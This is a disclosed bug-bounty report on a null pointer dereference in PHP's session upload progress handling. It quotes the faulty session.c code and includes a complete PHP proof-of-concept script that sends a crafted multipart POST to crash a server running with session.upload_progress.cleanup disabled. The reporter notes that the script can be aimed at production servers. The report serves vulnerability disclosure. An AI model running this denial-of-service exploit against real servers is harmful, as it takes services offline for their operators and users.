# Null Pointer Dereference in PHP Session Upload Progress

## Report Details
- **Report ID**: 798744
- **URL**: https://hackerone.com/reports/798744
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-18T11:07:52.157Z
- **Disclosed**: 2020-11-09T01:47:56.522Z

## Reporter
- **Username**: ryat
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Affected Versions
------------
Affected is all of PHP5.4/5.5/5.6
Affected is all of PHP7

Credits
------------
This vulnerability was disclosed by Taoguang Chen.

Description
------------
session.c
```
static int php_session_rfc1867_callback(unsigned int event, void *event_data, void **extra) /* {{{ */
{
	...
	switch(event) {
		case MULTIPART_EVENT_START: {
			multipart_event_start *data = (multipart_event_start *) event_data;
			progress = ecalloc(1, sizeof(php_session_rfc1867_progress));  <=== the progress was allocated and initialized with zeros.
			progress->content_length = data->content_length;
			progress->sname_len  = strlen(PS(session_name));
			PS(rfc1867_progress) = progress;
		}
		break;
		case MULTIPART_EVENT_FILE_START: {
			...
			if (Z_ISUNDEF(progress->data)) {
                ...
				array_init(&progress->data); <=== if goto MULTIPART_EVENT_FILE_START, &progress->data will be initialized with array-type ZVAL.
				...
			}
            ...
        }
        break;
		...
		case MULTIPART_EVENT_END: {
			multipart_event_end *data = (multipart_event_end *) event_data;

			if (Z_TYPE(progress->sid) && progress->key.s) {
				if (PS(rfc1867_cleanup)) {
					php_session_rfc1867_cleanup(progress);
				} else {
					SEPARATE_ARRAY(&progress->data); <=== if skip MULTIPART_EVENT_FILE_START, the &progress->data will be uninitialized, and still zeros.
					add_assoc_bool_ex(&progress->data, "done", sizeof("done") - 1, 1);
					Z_LVAL_P(progress->post_bytes_processed) = data->post_bytes_processed;
					php_session_rfc1867_update(progress, 1);
				}
				php_rshutdown_session_globals();
			}
```

When the session.upload_progress.cleanup INI option is disabled in php.ini with files upload fails, PHP will wrongly handles the upload progress data, then will be able to lead to use of null pointer. So attackers can exploit the issue to crash PHP remotely and don't need for any special PHP script code on the web server side.

Proof of Concept Exploit
------------

The issue can be easily triggered when session.upload_progress.cleanup=0 in php.ini. For exmaple PHP built-in web server.

/www/web/index.php
```
<?php
//do whatever
?>
```

Running PHP built-in web server.
```
$php -S localhost:8000 -t /www/web/ -d session.upload_progress.cleanup=0
```

poc.php
```
<?php

$host = 'localhost';
$port = '8000';
$addr = '/index.php';

$type = 'multipart/form-data; boundary=---------------------------2020';
$data = <<<EOF
-----------------------------2020
Content-Disposition: form-data; name="PHPSESSID"

session-upload
-----------------------------2020
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

ryat
-----------------------------2020--
EOF;

$message = "POST $addr  HTTP/1.1\r\n";
$message .= "Content-Type: $type\r\n";
$message .= "Host: $host\r\n";
$message .= "Content-Length: ".strlen($data)."\r\n";
$message .= "Connection: Close\r\n\r\n";
$message .= $data;

$fp = fsockopen($host, $port);
fputs($fp, $message);

$resp = '';
while ($fp && !feof($fp)) {
    $resp .= fread($fp, 1024);
}
var_dump($resp);

?>
```

Then executing the poc.php will trigger the issue, and crash the PHP built-in web server remotely.
```
$php poc.php
```

This poc.php can also be used to attack a production web environments with session.upload_progress.cleanup=0 in php.ini :-)

## Impact

The issue can be triggered as of PHP 5.4 with the session.upload_progress.cleanup INI option is disabled, and don't need for any special PHP code on the server side. Attackers can exploit the issue to crash PHP remotely.

## Attachments
No attachments
